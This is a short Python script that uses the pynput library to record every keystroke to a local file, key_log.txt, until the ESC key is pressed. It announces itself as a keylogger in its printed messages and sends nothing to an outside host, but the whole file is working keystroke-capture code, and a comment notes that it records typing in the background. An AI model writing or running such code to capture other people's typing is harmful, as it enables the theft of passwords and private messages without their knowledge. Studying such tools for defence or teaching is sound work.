from pynput import keyboard

# File to store the logs
log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

    # Stop logging if ESC is pressed
    if key == keyboard.Key.esc:
        print("\n🛑 Keylogger stopped.")
        return False  # This stops the listener

def main():
    print("🔴 Keylogger is running... (press ESC to stop)")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
        # it records in backgroung wht u have typed before pressing esc in key_log.txt file

if __name__ == "__main__":
    main()
